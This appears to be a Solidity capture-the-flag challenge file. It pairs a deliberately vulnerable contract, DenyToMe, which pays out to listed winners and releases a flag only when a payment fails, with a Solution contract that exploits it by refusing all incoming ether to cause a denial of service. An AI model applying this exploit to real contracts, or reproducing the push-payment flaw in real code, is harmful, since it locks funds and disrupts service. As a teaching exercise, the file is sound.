// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Contract that works when you deny service to it
contract DenyToMe {
	string private flag;
	uint256 public minimunFee;
	address[5] public tableOfWinners;

	modifier onlyWinners(){
		bool isWinner = false;
		for(uint i = 0; i < tableOfWinners.length; i++){
			if(tableOfWinners[i] == msg.sender){
				isWinner = true;
				break;
			}
		}
		require(isWinner, "You are not a winner");
		_;
	}

	constructor(uint256 _minimunFee, string memory _flag, address[5] memory _tableOfWinners) {
		flag = _flag;
		minimunFee = _minimunFee;
		tableOfWinners = _tableOfWinners;
	}

	/**
	 * @dev Function to set the caller of the function as a winner
	 *      in the table of winners
	 * @param _winner address of the winner
	 * @param _position position desired in the table
	 * @notice YOU MUST PAY (minimunFeee) ethers
	 */
	function makeMeWinner(uint256 _position, address _winner) payable public {
		require(msg.value == minimunFee, "You must pay the minimun fee");
		require(_position > 0 && _position <= tableOfWinners.length, "You must choose a valid position");
		
		address lastWinner = tableOfWinners[_position-1];
		tableOfWinners[_position-1] = _winner;
		
		bool sent = payable(lastWinner).send(msg.value);
		require(sent, "Failed to send Ether");
	}

	function isDeniedService() internal returns(bool){
		bool isContractDenied;
		// reverse traverse the table of winners
		for(uint i = tableOfWinners.length; i > 0; i--){
			address winner = tableOfWinners[i-1];
			bool sent = payable(winner).send(minimunFee);
			isContractDenied = isContractDenied || !sent;
		}

		return isContractDenied;
	}

	function getFlag() public payable onlyWinners returns(string memory){
		require(msg.value == minimunFee*tableOfWinners.length, "You must pay the minimun fee");
		require(isDeniedService(), "Contract has service has not been denied");
		return flag;
	}
}

contract Solution {
	string public flag;
	address public owner;
	DenyToMe public denyToMe;

	modifier onlyOwner() {
		require(msg.sender == owner, "You are not the owner");
		_;
	}

	constructor(DenyToMe _denyToMe) {
		owner = msg.sender;
		denyToMe = _denyToMe;
	}

 	function executeSolution() public payable onlyOwner {
        uint position = 1;
        require(denyToMe.minimunFee() == msg.value, "You must pay the minimun fee");
        denyToMe.makeMeWinner{value: msg.value}(position, address(this));
    }

    function getFlag() public payable onlyOwner returns (string memory) {
        require(denyToMe.minimunFee() * 5 == msg.value, "You must pay the minimun fee");
        flag = denyToMe.getFlag{value: msg.value}();
        return flag;
    }

    fallback() external payable {
        require(false, "Fallback function is not allowed");
    }

    receive() external payable {
        require(false, "Fallback function is not allowed");
    }
}


 
